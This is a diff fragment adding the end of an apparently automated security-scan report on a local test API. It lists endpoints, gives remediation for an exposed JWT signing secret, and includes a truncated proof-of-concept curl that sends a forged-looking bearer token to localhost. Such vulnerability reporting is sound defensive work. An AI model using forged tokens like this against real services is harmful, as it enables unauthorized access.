+        "response_dump": "{\n  \"endpoints\": [\n    \"GET  /api/v1/users/<id>\",\n    \"GET  /api/v1/search?q=<query>\",\n    \"POST /api/v1/login\",\n    \"GET  /api/v1/admin\",\n    \"POST /api/v1/upload\",\n    \"GET  /api/v1/ping?host=<host>\",\n    \"GET  /api/v1/config\"\n  ],\n  \"name\": \"CorpAPI v1.0\"\n}\n",
+        "remediation": "1. Never expose signing secrets via any endpoint or config.\n2. Rotate the compromised secret immediately.\n3. Use short-lived tokens and asymmetric signing (RS256).\n4. Store secrets in a vault, not in application config.",
+        "timestamp": "2026-10-22T07:25:22.898143",
+        "owasp_id": "A02",
+        "owasp_category": "A02:2021 Cryptographic Failures",
+        "poc_curl": "curl -s -H \"Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ...\" \"http://localhost:5000\""
+      }
+    }
+  ]
+}
